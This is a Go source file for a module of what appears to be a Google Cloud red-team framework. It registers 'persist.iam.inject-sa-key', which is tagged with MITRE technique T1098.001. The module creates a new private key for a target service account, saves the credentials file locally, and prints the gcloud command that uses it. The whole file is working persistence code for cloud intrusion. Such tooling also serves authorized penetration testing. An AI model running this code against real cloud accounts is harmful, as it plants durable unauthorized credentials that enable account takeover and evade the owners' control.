package iam

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"

	iamv1 "google.golang.org/api/iam/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&InjectSAKey{})
}

// InjectSAKey creates a new service account key for persistence and saves it locally.
type InjectSAKey struct{}

func (m *InjectSAKey) Info() module.Info {
	return module.Info{
		Name:         "persist.iam.inject-sa-key",
		Tactic:       module.TacticPersist,
		Service:      "iam",
		Description:  "Create a new SA key for persistence and save credentials locally",
		RequiresAuth: true,
		AttackID:     "T1098.001",
	}
}

func (m *InjectSAKey) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	if targetSA == "" {
		output.Warn("Usage: run persist.iam.inject-sa-key --target-sa <email> [--output <dir>]")
		output.Info("Tip: run 'recon.iam.list-principals' first to discover service accounts.")
		return nil
	}

	outputDir := ctx.Flags["output"]
	if outputDir == "" {
		outputDir = "."
	}

	svc, err := iamv1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create IAM client: %w", err)
	}

	output.Info("Creating persistence key for SA: %s", targetSA)

	key, err := svc.Projects.ServiceAccounts.Keys.Create(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamv1.CreateServiceAccountKeyRequest{
			KeyAlgorithm:   "KEY_ALG_RSA_2048",
			PrivateKeyType: "TYPE_GOOGLE_CREDENTIALS_FILE",
		},
	).Do()
	if err != nil {
		return fmt.Errorf("create SA key: %w", err)
	}

	// Decode and save the key.
	keyData, err := base64.StdEncoding.DecodeString(key.PrivateKeyData)
	if err != nil {
		return fmt.Errorf("decode key: %w", err)
	}

	outPath := filepath.Join(outputDir, fmt.Sprintf("%s-persist-key.json", targetSA))
	if err := os.WriteFile(outPath, keyData, 0o600); err != nil {
		return fmt.Errorf("write key file: %w", err)
	}

	output.Success("Persistence key created and saved to: %s", outPath)
	output.Warn("Key name: %s", key.Name)
	output.Warn("Expires: %s", key.ValidBeforeTime)
	output.Info("Use this key with: gcloud auth activate-service-account --key-file=%s", outPath)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "persist.iam.inject-sa-key",
			Severity:    module.SevCritical,
			Title:       "SA key injected for persistence",
			Description: fmt.Sprintf("Created new key for %s, saved to %s", targetSA, outPath),
			Resource:    targetSA,
		}
	}

	return nil
}
